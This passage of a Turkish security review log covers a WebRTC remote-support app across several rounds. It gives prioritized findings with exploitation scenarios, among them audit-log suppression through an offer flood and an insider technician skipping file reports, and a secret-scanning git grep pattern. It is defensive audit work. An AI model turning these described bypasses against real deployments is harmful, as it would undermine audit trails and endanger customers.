Repo açık kaynak olduğu için katkı yolu da bir tedarik zinciri girişi. Bugün staging'e root ile SSH yapılıyor ve
klon root sahipli, bu yüzden risk düşük.
Düzeltme (devops): `install`, betiği `/usr/local/sbin/remote-turn-fw` olarak (root:root 0755) kopyalasın ve gerekli
değerleri (`TURN_EXTERNAL_IP`, aralık) `/etc/default/remote-turn-fw`'ye (root 0600) yazsın. Ya da en azından
`install`/`ensure` betik dizininin sahibini ve yazma izinlerini denetleyip (`stat`; group/other yazabiliyorsa)
reddetsin. Runbook §9.2.1'e "betik güncellenince `install` yeniden çalıştırılır" notu eklenmeli.

### Otomatik tarama çıktıları (Tur 2)
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- gitleaks v8.30.1 (docker, dir modu, `.gitleaks.toml`): 10 eşleşme, **hepsi `apps/web/.next/**`** (`.previewinfo`,
  `prerender-manifest.json`, `preview-props.json` ve standalone kopyaları; git-ignore'daki derleme çıktısı, Next
  preview anahtarı). Kaynak/commit edilecek dosyalarda **0**.
- `sh -n host-firewall.sh` temiz; `print` staging girdisiyle beklenen 3+1 kuralı üretiyor.
- Regresyon: server unit **69/69** yeşil (bu turda koşuldu). Entegrasyon 93/93 implementation.md'den alındı, bu turda
  koşulmadı (MySQL gerekli).

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P3-T2-1, S-P3-T2-2 (P13/prod açılışından önce kapanmalı). S-P3-8 → P7 giriş şartı.

## P4 kod turu
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 3 (+1 bilgi)

### Bulgular (öncelik sırasıyla)

#### S-P4-1 [ORTA] `ABUSE_EMAIL` deploy'a bağlanmamış → public resolve her zaman Super Admin e-postasını döndürür — A01/A04 (bilgi ifşası)
Yer: `apps/server/src/public/consent.ts:61-65`, `apps/server/src/sessions/service.ts:` resolve dönüşü (`abuseEmail: abuse`);
`deploy/docker-compose.yml` server `environment:` (ABUSE_EMAIL yok), `.env.example` (yok), `docs/runbook.md` (yok).
Sorun: Compose `env_file` kullanmıyor; değişken açıkça verilmediği için `env.ABUSE_EMAIL` prod/staging'de hep boş, fallback
devreye giriyor: ilk aktif Super Admin'in e-postası (= giriş kimliği) her geçerli bağlantı/kod sahibine JSON'da ve
karşılama sayfasında (`guest-welcome.tsx:99-100` mailto) verilir. CLAUDE.md "yeni env → .env.example + compose + runbook" kuralı da ihlal.
İstismar senaryosu: Dolandırıcı kendi tenant'ında (veya ele geçirilmiş teknisyen hesabıyla) bir oturum açıp linki
kendisi açar → platformun en yetkili hesabının giriş e-postasını öğrenir → hedefli oltalama / parola deneme / 2FA
sosyal mühendisliği. V13 kullanıcı kararıdır; risk karar sahibinin bilmesi gereken düzeyde.
Düzeltme: `ABUSE_EMAIL` → `.env.example` (boş) + compose server `environment` + runbook; production'da zorunlu
(`env.ts` refine, SESSION_REF_KEY kalıbı) ve Super Admin fallback'i yalnız development'ta. (atanan: devops + backend-dev)

#### S-P4-2 [DÜŞÜK] `apps/web` devDependency `ws@8.18.3` — GHSA-58qx-3vcg-4xpx (yüksek, DoS) + bellek ifşası (orta) — A06
Yer: `apps/web/package.json:38`. Yalnız e2e mock (`e2e/mock-ws.mjs`) kullanıyor; standalone prod imajına girmez, server `ws@8.21.0` temiz.
Düzeltme: `8.21.0`'a yükselt (CI `pnpm audit` kapısını da yeşillendirir). (atanan: frontend-dev)

#### S-P4-3 [DÜŞÜK] Müşteri adında kontrol/bidi karakteri filtresi yok — A03/A04
Yer: `packages/contracts/src/api/sessions.ts:104` (`trim().min(2).max(100)`).
Sorun: XSS yok (React metin, `dangerouslySetInnerHTML` yok; audit JSON). Ancak `‮`, satır sonu, sıfır genişlikli
karakterle teknisyen lobisinde/audit ekranında yanıltıcı ad ("Destek Ekibi — kodu okuyun") gösterilebilir.
Düzeltme: `\p{Cc}\p{Cf}` (bidi/ZW dahil) reddi veya temizleme; gerekirse `customerEmail` kullanılmıyorsa şemadan çıkar. (atanan: backend-dev)

#### S-P4-4 [DÜŞÜK] Müşteri adı teknisyen sekmesinin sessionStorage'ında çıkışta silinmiyor — A02/KVKK
Yer: `apps/web/lib/webrtc/use-tech-session.ts:13-28,128-133`. Yalnız `phase==="ended"` olunca silinir; sekme açık
kalıp logout yapılırsa veya konsoldan oturum bitmeden ayrılınırsa ad aynı sekmede kalır (paylaşımlı bilgisayar). Etki düşük (sekme kapanınca gider).
Düzeltme: logout'ta `rs.guestName.*` anahtarlarını temizle. (atanan: frontend-dev)

#### S-P4-5 [BİLGİ] Next `/ws` rewrite prod'da etkisiz
`next.config.ts` rewrite yalnız web'e ulaşan istekte çalışır; Caddy `/ws/*`'ı server'a önce yönlendiriyor ve web portu
yayımlanmıyor. Yalnız `/ws` (eğik çizgisiz) web'e düşer → server'da 404. Risk yok; istenirse rewrite `NODE_ENV!=="production"` koşuluna alınabilir.

### Doğrulanan kontroller (odak listesi)
- **KVKK onay bütünlüğü:** `acceptConsent` id + oturumun tenant'ı + `is_current` ile arar (başka tenant/eski sürüm → 400,
  ayırt edilmez); kayıt admit TX'inde `consumeForAdmit`=1 sonrası (count=0 → yazılmaz); bileşik FK
  `(consent_text_id, tenant_id, consent_sha256)` + `CHECK sha256 = SHA2(body,256)` + `app` için UPDATE/DELETE yok →
  metin değişmez, onay kaydı gösterilen sürüme bağlı. Join→admit arasında yeni sürüm yayımlanırsa müşterinin gördüğü
  sürüm kaydedilir (doğru davranış). Tek `is_current` fonksiyonel UQ ile.
- **Konsol yetkisi:** `/ws/tech` `row.technicianId !== auth.user.id` → 403 (`signaling/ws.ts:99`). Relay yalnız
  `room.tech.peer` ↔ `room.admitted.peer`; kabul edilmemiş misafirden SDP/ICE → 1008. SDP ≤60 KB, ICE ≤2000.
- **Terminate:** `sessions.terminate` yetkisi + `tenantScope` + `terminateActive(tenantId,id)` + audit; aynı TX.
- **Medya yönü:** teknisyen `addTransceiver("video",{direction:"recvonly"})`, hiç iz eklemiyor; misafir `sendonly`,
  `getUserMedia` yok, `audio:false`; Permissions-Policy `camera=() microphone=() display-capture=(self)`.
- **getDisplayMedia** yalnız `share-start` butonu `onClick` → `startShare`; yeniden bağlanmada otomatik paylaşım yok;
  `ended` olayında paylaşım durur; share-strip göstergesi.
- **Kimlik bilgisi saklama:** ticket/reconnect token yalnız bellek + `Sec-WebSocket-Protocol`; URL/depo/log yok; TURN
  credential yalnız `RTCPeerConnection` config'i ve ref'te; token sunucuda resolve edilir, istemci JS'ine verilmez.
- **ICE/IP ifşası:** tarayıcı varsayılanı mDNS host adayları; srflx adayı doğası gereği public IP verir (karşı taraf
  kimliği doğrulanmış teknisyen) — kabul edilmiş risk.
- **CSP/çerçeve:** `frame-ancestors 'none'` + `/session/*` proxy matcher içinde → ekran paylaşım sayfası çerçevelenemez;
  `connect-src 'self' wss://host`; `media-src` gereksiz (`srcObject` URL değil); `referrer: no-referrer`, `noindex`.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: 2 (1 high, 1 moderate) — ikisi de `apps/web > ws@8.18.3` (S-P4-2).
- gitleaks v8.30.1 `dir` (.gitleaks.toml): 10 eşleşme, **tamamı `apps/web/.next/**`** (build çıktısı, preview-props;
  repoya girmez) → kaynakta 0.

### Tasarımda vaat edilip kodda bulunmayanlar
- `ABUSE_EMAIL` env üçlüsü (.env.example/compose/runbook) — S-P4-1.

### Olumlu
Onay modeli DB düzeyinde değişmez ve bileşik FK'lı; tüketim + onay + audit tek TX; nonce kind'ı sunucu kaydından;
relay sınırı sunucuda; misafir kimlik bilgileri bellekte; CSP nonce'lu, `unsafe-inline` yok.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P4-1 prod açılışından (P10/P13) önce kapanmalı; S-P4-2..4 P5 içinde.

## P4 kod turu 2
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+2 bilgi). Önceki S-P4-1..4 kapandı.

### Önceki bulguların doğrulaması
| Bulgu | Durum | Kanıt |
|---|---|---|
| S-P4-1 [ORTA] Super Admin e-postası ifşası | KAPANDI | `apps/server/src/public/consent.ts:68-73` — `fromEnv` yoksa ve `superAdminFallback=false` ise DB sorgusu yapılmadan `null`; `sessions/routes.ts:78-79` `superAdminFallback: NODE_ENV !== "production"`. Compose `deploy/docker-compose.yml:98` `ABUSE_EMAIL:` (değersiz geçiş), `.env.example`, runbook §3 güncel. |
| S-P4-2 [DÜŞÜK] web `ws` açığı | KAPANDI | `apps/web/package.json:40` `ws: 8.21.0`; lockfile yalnız `ws@8.21.0`; `pnpm audit --audit-level=moderate` → "No known vulnerabilities found". |
| S-P4-3 [DÜŞÜK] görünmez karakterli ad | KAPANDI (kalan kısım S-P4-T2-1) | `packages/contracts/src/api/sessions.ts:107,114` — `UNSAFE_NAME_CHARS` (C0/C1, U+200B-200F, bidi U+202A-202E/2066-2069, BOM) `refine` ile `.trim()` öncesi kontrol ediliyor; trim ile kenardaki kontrol karakterinin gizlenmesi engellendi. |
| S-P4-4 [DÜŞÜK] sekmede müşteri adı kalması | KAPANDI | `apps/web/lib/session-storage.ts` `clearSessionData()` yalnız `rs.` önekli anahtarları siler, depolama kapalıysa sessiz; `app/(panel)/logout-button.tsx:29` çıkışta çağırıyor; birim testi var. |

### Yeni yüzeyler
- **hello.guestName / hello.share / peer.joined.guestName**: Yalnız `room.tech?.peer.send(...)` ile, aynı odanın teknisyenine gidiyor (`signaling/active.ts:18-28,78`, `rooms.ts:183`); misafire veya başka odaya yayın yok. `guest.name` kaynağı `joinSessionInputSchema` (max 100, kontrol/bidi filtresi) — giden şema da `max(100)` (`contracts/src/ws.ts:90,103`). Web tarafında `dangerouslySetInnerHTML`/`innerHTML` yok; ad React metni olarak basılıyor.
- **share.state spoof**: `onGuestMessage` (`signaling/handlers.ts:83-113`) yalnız `ADMITTED` misafirden ve `guest.peer === peer` iken işliyor; kabul edilmemiş misafir 1008 ile kapatılıyor. Yazılan tek yer `room.share` (kendi odası) ve kendi odasının teknisyeni; `rooms.ts:172` misafir ayrılınca `stopped`'a sıfırlıyor. Şema sıkı: `strictObject`, `monitors ≤16`, `id 0..64`, `name ≤64`, `w/h ≤16384`; çerçeve token bucket'tan geçiyor. Misafir yalnız kendi ekran durumunu "yanlış" bildirebilir — kendi oturumunu etkiler, güvenlik sınırı değil.
- **env.ts `withoutBlanks`** (`apps/server/src/env.ts:68-74`): boş/boşluk değerler tanımsız sayılıyor; prod zorunluları (`TRUSTED_PROXY_CIDR`, `SESSION_REF_KEY`) `refine` ile boşken yine hata veriyor, zorunlu `DATABASE_URL` boşken hata — `test/unit/env-logger.test.ts:27-38` kapsıyor. Hata mesajı yalnız anahtar adı içeriyor.
- **scripts/e2e-real-users.ts**: `NODE_ENV=production` iken çalışmıyor (`:58`); parola/e-posta yalnız env'den (sabit sır yok), parola 12-200 karakter, argon2id hash; yalnız `demo` tenant'ında ve yalnız mevcut ADMIN'e dokunuyor (başka tenant/rol → reddediyor, `:34`); her işlem audit'e yazılıyor. Bkz. S-P4-T2-2.
- **deploy/turn/entrypoint.sh TURN_LISTEN_IPS**: CR/LF içeren değer reddediliyor (config satır enjeksiyonu yok); her öğe `is_ipv4` (tam dize, 4 oktet, 0-255, baştaki sıfır yok) ile doğrulanıyor, aksi `die` (fail closed). Tırnaksız `for ip in $(...)` glob genişlemesi yapabilir ama genişleyen her öğe `is_ipv4`'te düşer → enjeksiyon yok. `auto` yalnız doğrulanmış `PRIVATE_IP` + 127.0.0.1.
- **"Cihaz desteklenmiyor" ekranı** (`apps/web/lib/device-support.ts`): yalnız istemci tarafı UX kontrolü; atlatılması güvenlik etkisi taşımaz, güvenlik sınırı olarak SAYILMAZ (yetki/kabul kontrolleri sunucuda: admit kodu, ADMITTED durumu, public client kontrolü ADR-0012).

### Bulgular
#### S-P4-T2-1 [DÜŞÜK] `UNSAFE_NAME_CHARS` bazı görünmez biçim karakterlerini kapsamıyor — A03/A04 (görüntü sahteciliği)
Yer: `packages/contracts/src/api/sessions.ts:107`
Sorun: U+00AD (soft hyphen), U+034F, U+061C (ALM, bidi), U+180E, U+2028/2029, U+2060-2064 (word joiner, invisible operators), U+FFF9-FFFB, etiket karakterleri U+E0000-E007F listede yok. U+061C bir bidi işaretidir.
İstismar senaryosu: Misafir "Ahmet⁠⁠" veya U+061C ile görünürde aynı/yanıltıcı ad girer; teknisyen konsolunda ve audit'te ad farklı bayt dizisiyle görünür. XSS yok (React metin); etkisi sınırlı kimlik karışıklığı.
Düzeltme: Liste yerine Unicode kategori: `/[\p{Cc}\p{Cf}\p{Zl}\p{Zp}͏᠎]/u` (Cf; ZWJ'li emoji desteklenmeyecekse yeterli). (atanan ajan: backend-dev)

#### S-P4-T2-2 [DÜŞÜK] `e2e-real-users.ts` prod imajında ve korumanın tek kaynağı `NODE_ENV` — A05
Yer: `apps/server/scripts/e2e-real-users.ts:58`; `apps/server/Dockerfile:56` (`COPY ... apps/server` → `scripts/` imaja giriyor)
Sorun: Script operatör aracıdır; prod imajında bulunuyor ve koruma yalnız `NODE_ENV`. Yerel makineden `DATABASE_URL` prod'u gösterecek şekilde (NODE_ENV tanımsız) çalıştırılırsa ve prod'da `demo` tenant'ı varsa (staging-users.sh oluşturur), o tenant'taki ADMIN'lerin parolası sıfırlanır ve `mustChangePassword=false` olur.
İstismar senaryosu: Doğrudan uzaktan istismar yok; operatör hatası / içeriden kötüye kullanım ile yetkili hesap parolası değişir (audit'te `source: e2e-real-users` kalır).
Düzeltme: Ek koruma `E2E_REAL_ALLOW=1` + DB host'unun localhost/staging allowlist'i, veya imajdan `scripts/` hariç tutma (`.dockerignore` / prod-deps aşamasında silme). (atanan ajan: devops)

#### Bilgi
- B-1: `deploy/docker-compose.yml:97` ve runbook §3 (`ABUSE_EMAIL` satırı) "boş dize geçerse server açılmaz" diyor; `withoutBlanks` sonrası bu artık doğru değil (boş = tanımsız). Güvenlik etkisi yok, doküman güncellenmeli (devops/teknik-yazar).
- B-2: `clearSessionData` yalnız çıkış butonunda; oturum süresi dolup 401 ile login'e yönlenmede çağrılmıyor. `sessionStorage` sekme kapanınca silindiği için risk düşük; isteğe bağlı olarak login sayfası yüklenirken de çağrılabilir.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate` → `No known vulnerabilities found`
- `gitleaks` yerelde kurulu değil (CI'da çalışıyor). Elle tarama: `git grep -nE "(api[_-]?key|secret|password|token)\s*[:=]\s*['\"][^'\"]{8,}"` (test/e2e hariç) ve izlenmeyen yeni dosyalarda (`scripts/`, `src/public`, `src/signaling`, `web/lib`, `playwright.real.config.ts`, `e2e/p4-real.spec.ts`, `deploy/turn`, `contracts/src`) aynı desen → eşleşme yok. `.env.example` diff'i yalnız boş anahtarlar içeriyor. `.gitleaks.toml` allowlist'i yalnız `test/helpers/app.ts` ve `test/helpers/secrets.ts` (sahte değerler).
- `git log --all -- '*.env*'` → yalnız `d90dd2d` (`.env.example`; gerçek `.env` geçmişte yok).

### Olumlu
- S-P4-1 düzeltmesi fail-closed: prod'da DB'ye hiç gidilmiyor.
- Signaling tarafında misafir girdisi her yerde sıkı şema + kabul durumu + peer eşleşmesi ile korunuyor; oda dışına sızma yolu yok.
- entrypoint.sh tüm env değerlerinde satır sonu reddi ve IPv4 tam doğrulaması ile fail-closed.
- Orta/Düşük öneriler `docs/gereksinimler.md` §9'a "Sonra" olarak eklenebilir (S-P4-T2-1, S-P4-T2-2, B-1, B-2).

## P4 kod turu 3 (sayfa testi düzeltmesi: TEST-P4-1 F5 dönüşü, TEST-P4-2)
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+1 bilgi). Dar kapsam: `apps/web/lib/guest-resume.ts`, `app/session/[token]/{guest-resume-gate,guest-session}.tsx`, `lib/webrtc/use-guest-session.ts`, `apps/server/src/signaling/{ws,rooms,active}.ts`.

### Oturum ele geçirme analizi (backend) — yeni vektör YOK
- **Token tek kullanımlık ve dönüyor:** `active.ts:31-46` `sendHelloGuest` her admit/yeniden bağlanmada eski `reconnectHash`'i siler, yeni token üretir; yeni token yalnız yeni misafir soketine gider. `teardown` (`rooms.ts:227`) haritadan siler.
- **Yarış (iki eşzamanlı reconnect aynı token ile):** `ws.ts:134-147` başarılı yolda `await` yok; `wss.handleUpgrade` (`ws.ts:55`, `verifyClient` yok, `perMessageDeflate:false`) geri çağrıyı eşzamanlı çalıştırır → `bindGuest → reattachGuest → sendHelloGuest` (token rotasyonu) aynı tikte biter. İkinci istek döndürülmüş hash'i bulamaz → 403 `reconnect`. Aynı token iki kez tüketilemez.
- **CLOSING penceresi** (`ws.ts:141` yalnız `isOpen()` çakışma): saldırganın bu pencereden faydalanması için *güncel* reconnectToken'a zaten sahip olması gerekir; bu token'la misafir soketi kapandığı anda (önceki davranış) da devralabilirdi. Sunucu kaynaklı CLOSING yalnız `teardown`'da olur ve o anda oda/hash silinmiştir. Saldırgan misafirin soketini uzaktan CLOSING'e sokamaz. Pencere yeni bir yetki kazandırmıyor.
- `reattachGuest` (`rooms.ts:182-190`) eski peer'ı `detachGuest` ile ayırıyor (`share: stopped`, teknisyene `peer.left`); eski soketin geç `close`'u `guest.peer !== peer` (`rooms.ts:169`) ile etkisiz → durum karışması yok. Devralan taraf ekran paylaşımını otomatik almaz (paylaşım yeniden `getDisplayMedia` tıklaması ister).
- **peer.joined.maxEndsAt:** yalnız aynı odanın teknisyenine (`active.ts sendGuestJoined`), değer sunucu hesaplı (consumedAt + max_active_hours), hassas değil.

### Bulgular
### [DÜŞÜK] S-P4-T3-1 reconnectToken artık sekme deposunda kalıcı — A07 Identification and Authentication Failures / A04
Yer: `apps/web/lib/guest-resume.ts:10-17,58-64`; `app/session/[token]/guest-session.tsx:53-58`
Sorun: Token önceden yalnız bellekteydi; şimdi `sessionStorage['rs.resume.<sha256(link)[:16B]>']`'de. (a) XSS durumunda bellekten de ele geçirilebilirdi, fark küçük; CSP sıkı (`apps/web/proxy.ts:20` `'nonce-…' 'strict-dynamic'`, prod'da `unsafe-inline/eval` yok), web'de `dangerouslySetInnerHTML` yok. (b) Yeni yüzey tarayıcı davranışı: sessionStorage "Sekmeyi çoğalt" ve "Kapatılan sekmeyi yeniden aç" (Ctrl+Shift+T) ile kopyalanır/geri gelir; `window.open` (noopener olmadan) da kopyalar.
İstismar senaryosu: Paylaşılan bilgisayarda müşteri sekmeyi oturumu bitirmeden kapatır; oturum ACTIVE ve misafir soketi kapalıyken aynı makinedeki başka biri sekmeyi geri açar → lobisiz yeniden bağlanır (teknisyene "müşteri döndü" görünür). Etki sınırlı: ekran paylaşımı aynı makinenin ekranıdır ve yeniden tıklama ister; teknisyenin `peer.left/joined` görüp oturumu bitirebilmesi mevcut. Çoğaltılmış sekmede ise orijinal soket OPEN iken 403 conflict alır (devralma yok).
Düzeltme: Kabul edilebilir risk; isteğe bağlı sertleştirme — kayda `savedAt` ekleyip `RECONNECT_WINDOW_MS` (120 sn) aşan kaydı okumamak (F5 için yeterli, sekme geri açma penceresini daraltır); `pagehide` + `persisted=false` olmadan silme gerekmez. (atanan ajan: frontend-dev)

### [DÜŞÜK] S-P4-T3-2 Dönüş deneme penceresi sunucu ölü-soket süresinden kısa; her deneme audit satırı — A09 Security Logging and Monitoring Failures
Yer: `apps/web/lib/webrtc/use-guest-session.ts:20-21,96-106`; `apps/server/src/signaling/ws.ts:141-143,176-184`
Sorun: Sunucu ölü soketi en geç ~90 sn'de düşürür (30 sn ping, `missed >= 2` → 3. tikte `terminate`), istemci 20 × 3 sn ≈ 60 sn (+ status gecikmesi) dener → çökme/ağ kopmasında meşru dönüş `resumeFailed` olabilir (işlevsel). Ayrıca her 403 conflict `reconnect.conflict` audit satırı yazar: tek F5 için ≤ 20 satır. DoS açısından sınırlı: WS upgrade `guestIp` 31/dk/IP (`ws.ts:59`), status `statusIp` 60/dk/IP (`sessions/public.ts:121,213`); istemci 3 sn'de 1 upgrade + 1 status = 20/dk, limitlerin altında; 429 da yeniden denemeyi durdurmaz ama aralık sabit 3 sn, sınırlı (20).
İstismar senaryosu: Geçerli token sahibi biri (yalnız müşterinin kendisi) audit tablosunu dakikada ≤ 31 satırla doldurabilir — IP limitiyle sınırlı, yetki kazancı yok.
Düzeltme: backend-dev — `reconnect.conflict` audit'ini oda başına dakikada 1 ile tekilleştir (sayaç metrikte kalsın). frontend-dev — `RESUME_MAX_ATTEMPTS × RESUME_RETRY_MS`'i sunucu `pingMs × 3` + pay (≥ 100 sn, `RECONNECT_WINDOW_MS` 120 sn içinde) ile hizala.

### [BİLGİ] G-01 / G-13 ile uyum
- Depoya yazılan alanlar: `reconnectToken`, `technicianName`, `customerName`, `verifyCode`, `sessionRef` (zod şemalı, uzunluk sınırlı; bozuk kayıt silinir — `guest-resume.ts:45-56`). Link token'ı yazılmaz, anahtar SHA-256 önekidir (aynı origin'de başka link/oturumla karışma yok; 128 bit önek çakışması pratikte imkânsız).
- G-01: reconnectToken yalnız admit sonrası `hello`'dan gelir ve yalnız `state.reconnectToken` doluyken yazılır → lobi/kabul öncesi depoda token yok. `verifyCode` = `techVerifyCode` (müşterinin teknisyeni teyidi; resolve'da zaten müşteriye gösterilir, müşteriyi doğrulamaz) → gizli değil. `sessionRef` opak, status ucu yalnız `{status}` döner.
- G-13: TURN credential/iceServers depoya yazılmıyor (dönüşte `hello` yenisini verir). Çelişki yok.
- Silme: `ended` fazında (`guest-session.tsx:54`), `consumed` dışı sonlarda (`guest-resume-gate.tsx:30`), panel çıkışında `clearSessionData` (`rs.` öneki). Token URL/log'a yazılmıyor; WS'de `Sec-WebSocket-Protocol` ile gidiyor (Caddy logunda yazılmıyor, G-10).

### Öneri (`docs/gereksinimler.md` §9 "Sonra")
S-P4-T3-1 (kayda süre damgası), S-P4-T3-2 (conflict audit tekilleştirme + deneme penceresi hizalama).

---

## P5 kod turu 1 (sohbet, dosya transferi, işaretleme, kalite özeti)
Tarih: 2026-11-11 · Kapsam: `packages/contracts/src/{files,dc,ws}.ts`, `apps/server/src/signaling/{collab,handlers}.ts`, `apps/web/lib/dc/*`, `components/collab/*`, `components/guest/guest-collab.tsx`, `use-quality`, migration `20261111040000_p5_session_files`, `grants.sql`
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 2 / Düşük 5

### [YÜKSEK] S-P5-1 Teklif seliyle `file.meta` kotası tüketilip gerçek transferin audit kaydı düşürülebiliyor — A09 Security Logging and Monitoring Failures
Yer: `apps/server/src/signaling/collab.ts:25-36,59-64` (oda başına ortak 20/dk + 500/oturum sayaç); `apps/web/lib/dc/files.ts:243-259` (her otomatik ret → `file.meta REJECTED`); `apps/web/lib/dc/use-collab.ts:60` (gelen ctl'de hız sınırı yok)
Sorun: Hız sınırı oda geneli ve sonuçtan bağımsız. Otomatik retler (busy/cooldown/tooLarge/caps) de kotadan yer. Gönderen taraf, alıcının istemcisine sınırsız `file.offer` yollayarak alıcının sunucuya `file.meta` göndermesini tetikleyebilir. Kota dolunca sonraki `OK` raporu `RATE_LIMITED` alıyor ve `session_files` ile `audit_logs`'a hiçbir şey yazılmıyor. Geride yalnız bir log uyarısı kalıyor.
İstismar senaryosu: Kötü niyetli bir teknisyen (içeriden tehdit) müşteriye A dosyasını teklif ediyor (müşteride "pending"). Ardından DC üzerinden 20 sahte teklif daha yolluyor. Müşteri istemcisi bunları "busy" olarak otomatik reddediyor ve 20 `file.meta` gönderiyor, böylece dakikalık pencere doluyor. Müşteri 60 sn içinde A'yı kabul ediyor. Transfer bitince gelen `OK` meta kaydı reddediliyor. Sonuç: müşteriye gönderilen (zararlı olabilecek) dosyanın adı ve SHA-256'sı hiçbir kayıtta yok. AC-55 ve audit zorunluluğu delinmiş oluyor. Aynı yolla 500/oturum kotası tüketilerek oturumun geri kalanı tamamen kayıtsız kalabilir.
Düzeltme: backend-dev: Kotayı sonuca göre ayırın. `OK`/`CORRUPT` (kabul edilmiş transferin sonucu) hiç düşürülmemeli ya da ayrı ve yüksek bir kotası olmalı. `REJECTED`/`CANCELLED` ayrı bir kotayla sınırlanmalı. Kota aşıldığında oturum başına bir kez `file.meta_rate_limited` audit satırı yazılmalı (sessiz kayıp olmamalı). frontend-dev: Alıcı istemci, otomatik retlerde `file.meta`'yı tekilleştirmeli/özetlemeli (ör. 10 sn'de en çok 1). Gelen `file.offer` için alıcı tarafında hız sınırı konmalı (ör. 5/10 sn, aşanlar sessizce düşer). Bu testle doğrulanmalı (21 teklif + 1 OK → OK kaydı var).

### [ORTA] S-P5-2 Teklif seli karşı tarafın WS bağlantısını 1008 ile kopartıyor ve listeyi sınırsız büyütüyor — A04 Insecure Design (DoS)
Yer: `apps/web/lib/dc/files.ts:230-262` (`inc` Map ve `list` sınırsız); `apps/server/src/signaling/handlers.ts:17,42` (TokenBucket 50/sn, aşımda `peer.close(POLICY)`)
Sorun: DC `ctl` kanalında alıcı tarafta hız sınırı yok. Saniyede 50'den fazla teklif gelirse alıcı da saniyede 50'den fazla `file.meta` WS mesajı üretiyor (amplifikasyon). Sunucu, kurban tarafın soketini `ws_rate_exceeded` ile kapatıyor. Ayrıca her otomatik ret `list`'e ekleniyor (caps dışındakiler), bu da React render ve bellek yükünü sınırsız büyütüyor.
İstismar senaryosu: Kabul edilmiş müşteri (veya teknisyen), değiştirilmiş istemciyle döngüde `file.offer` yolluyor. Karşı tarafın WS'i kopuyor ve sinyalizasyon/ICE restart çalışmıyor. Sekme, binlerce satırlık listeyle yavaşlıyor. Kalıcı yetki kazancı yok. Ancak meşru tarafı "bağlantı koptu" durumuna düşürüyor ve S-P5-1'i besliyor.
Düzeltme: frontend-dev: S-P5-1'deki alıcı tarafı teklif sınırı. Aşımda `file.meta` gönderilmemeli ve `list`'e eklenmemeli. Otomatik ret kayıtları `list`'te en çok N (ör. 20) tutulmalı. Aynı zamanda `chat`/`annot.*` için de alıcı tarafı sınırı konmalı (bkz. S-P5-6). Sunucu tarafında değişiklik gerekmiyor (bucket doğru çalışıyor; sorun istemcinin karşı tarafın girdisini WS'e yansıtması).

### [ORTA] S-P5-3 `TO_TECH` kaydının tek kaynağı teknisyen istemcisi; değiştirilmiş konsol müşteriden dosya alıp hiç raporlamayabilir — A09 / A04
Yer: `apps/server/src/signaling/collab.ts:47-52` (gönderen raporu yok sayılıyor; tek kaynak alıcı); `packages/contracts/src/ws.ts` `fileMetaSchema` yorumu
Sorun: İçerik P2P aktığı için sunucu transferi göremiyor. `TO_TECH` yönünde rapor yalnız teknisyenden kabul ediliyor. Müşteri tarafının (gönderen) raporu atılıyor. İçeriden kötü niyetli bir teknisyen, `file.meta` göndermeyen bir konsolla müşteriden veri çekebilir ve hiçbir iz kalmaz. Bu, A09'un "denetlenen kişinin kendi kaydını yazması" durumudur.
İstismar senaryosu: Teknisyen tarayıcı konsolunda `sendMeta`'yı no-op yapıyor ve müşteriye "şu log dosyasını gönderin" diyor. `session_files`/`audit_logs` boş kalıyor.
Düzeltme: mimar + backend-dev: Gönderenin raporu da ayrı bir alan/satır olarak kaydedilmeli (ör. `reporter` = `sender|receiver`). Sunucu, alıcı raporu yoksa en azından gönderenin "offer/done" iddiasını audit'e yazmalı. Müşteri istemcisi değiştirilmemiş varsayıldığından bu, teknisyene karşı güvenilir iz sağlar. Mimari §4'te tasarım sapması/risk kabulü olarak işlenmeli.

### [DÜŞÜK] S-P5-4 Alınan dosya tamamen bellekte; SHA-256 için ikinci kopya — A04 (istemci DoS)
Yer: `apps/web/lib/dc/files.ts:279,287-289` (`chunks[]` → `Blob` → `sha256Hex` içinde `blob.arrayBuffer()`); gönderen `files.ts:161` (`sha256Hex(file)` dosyanın tamamını okuyor)
Sorun: Tenant sınırı 2048 MiB'a kadar çıkabiliyor. Bu durumda alıcıda yaklaşık 2× dosya boyutu RAM gerekiyor, `arrayBuffer()` ≥ 2 GB'ta hata verip sekmeyi çökertebilir. Gönderen de aynı şekilde etkileniyor. Kullanıcı kabulü gerektiği ve varsayılan 100 MB olduğu için düşük.
Düzeltme: frontend-dev: Artımlı özet (ör. `hash-wasm` veya parça parça SHA-256), alıcıda `chunks` yerine OPFS/`FileSystemWritableFileStream` (destek yoksa ≤ 256 MB üst sınır). Kısa vadede UI'da tenant sınırı 512 MB üzerindeyse uyarı gösterilebilir.

### [DÜŞÜK] S-P5-5 İndirme Blob'u MIME türü olmadan oluşturuluyor — A05 Security Misconfiguration
Yer: `apps/web/lib/dc/files.ts:287,291`; `components/collab/files-panel.tsx:42`
Sorun: `new Blob(chunks)` → `type=""`. `download` özniteliği tıklamada dosyayı indiriyor, ama kullanıcı bağlantıyı "Yeni sekmede aç" ile açarsa `blob:` URL'si uygulama origin'inde gezinir. Bu durumda tarayıcı türü koklayarak (sniffing) HTML/SVG içeriği belge olarak çizebilir. CSP (nonce + strict-dynamic, `proxy.ts:20`) blob belgelerine miras kaldığı için betik çalışması bugün engelleniyor. Ancak HTML ile oltalama/sahte form çizilebilir.
Düzeltme: frontend-dev: `new Blob(chunks, { type: "application/octet-stream" })`. İndirme bağlantısında tehlikeli/çift uzantı uyarısı da tekrar gösterilmeli (şu an yalnız kabul diyaloğunda).

### [DÜŞÜK] S-P5-6 Gelen `chat` / `annot.*` için alıcı tarafında hız sınırı yok — A04
Yer: `apps/web/lib/dc/use-collab.ts:57,62`; `lib/dc/annot.ts:58,64`; `lib/dc/chat.ts:31-32`
